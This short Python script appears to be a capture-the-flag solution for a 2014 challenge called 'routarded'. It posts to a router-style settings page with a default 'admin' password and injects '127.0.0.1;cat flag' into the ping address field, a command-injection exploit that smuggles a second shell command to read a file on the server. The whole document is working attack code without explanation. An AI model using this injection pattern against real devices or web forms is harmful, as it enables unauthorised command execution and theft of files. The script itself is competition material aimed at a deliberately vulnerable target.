import requests
r = requests.post("http://routarded_87f7837f50a5370771b9467d840c93c5.2014.shallweplayaga.me:5000/settings.cgi", auth=('','admin'), data={"action": "doPing", "inputIPAddress" : "127.0.0.1;cat flag"})
print r.text